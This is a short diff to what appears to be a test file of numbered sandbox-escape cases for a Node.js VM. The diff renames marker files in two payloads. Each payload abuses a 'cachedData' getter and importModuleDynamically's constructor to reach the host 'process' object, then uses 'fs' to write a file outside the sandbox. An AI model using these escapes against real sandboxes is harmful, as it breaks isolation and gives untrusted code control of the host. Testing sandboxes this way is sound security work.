@@ -714,7 +714,7 @@ constructor.prototype.__defineGetter__('cachedData', function(){this.importModul
   console.log('Q23 check=',typeof(process),typeof(Promise));
 }).then(async()=>{
 var code=`
-Object.defineProperty(constructor.prototype, 'cachedData', {get(){this.importModuleDynamically.constructor('return process')().then(p=>p.mainModule.require("fs").writeFileSync("pwned", ""))}});
+Object.defineProperty(constructor.prototype, 'cachedData', {get(){this.importModuleDynamically.constructor('return process')().then(p=>p.mainModule.require("fs").writeFileSync("pwned_q24", ""))}});
 (_=>_)
 `;
   try{
@@ -725,7 +725,7 @@ Object.defineProperty(constructor.prototype, 'cachedData', {get(){this.importMod
   console.log('Q24 check=',typeof(process),typeof(Promise));
 }).then(async()=>{
 var code=`
-constructor.defineProperty(constructor.prototype, 'cachedData', {get(){this.importModuleDynamically.constructor('return process')().then(p=>p.mainModule.require("fs").writeFileSync("pwned", ""))}});
+constructor.defineProperty(constructor.prototype, 'cachedData', {get(){this.importModuleDynamically.constructor('return process')().then(p=>p.mainModule.require("fs").writeFileSync("pwned_q25", ""))}});
 (_=>_)
 `;
   try{
